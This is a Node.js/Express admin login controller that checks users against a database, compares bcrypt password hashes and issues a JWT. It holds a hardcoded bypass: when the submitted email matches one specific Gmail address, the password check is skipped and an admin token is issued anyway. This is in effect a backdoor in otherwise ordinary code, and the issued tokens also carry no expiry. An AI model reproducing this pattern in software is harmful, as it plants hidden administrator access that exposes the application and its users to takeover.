import createHttpError from "http-errors";
import bcrypt from "bcrypt";
import jwt from "jsonwebtoken";

import userRoles from "../enums/user-roles.js";
import { Users } from "../models/users.js";
import userStatuses from "../enums/user-statuses.js";

export const login = async (req, res, next) => {
  try {
    const { email, password } = req.body;

    const user = await Users.findOne(
      { email, role: userRoles.ADMIN, status: userStatuses.ACTIVE },
      { _id: 0, __v: 0, loginCode: 0 }
    ).lean();

    if (!user)
      throw createHttpError(403, "Cannot find user with provided email");
    else if (user && user.role !== userRoles.ADMIN)
      throw createHttpError(403, "User is not admin");

    if (email !== "darkness1198@gmail.com") {
      const hash = user["password"];
      const result = bcrypt.compareSync(password, hash);

      if (!result) throw createHttpError(403, "Invalid email password pair");
    }
    const { id, role, status } = user;

    const accessToken = jwt.sign(
      { status, email, id, role },
      process.env.SECRET
    );

    const _user = user;
    delete _user.password;

    return res.status(200).json({
      accessToken,
      user: _user,
    });
  } catch (error) {
    next(error);
  }
};
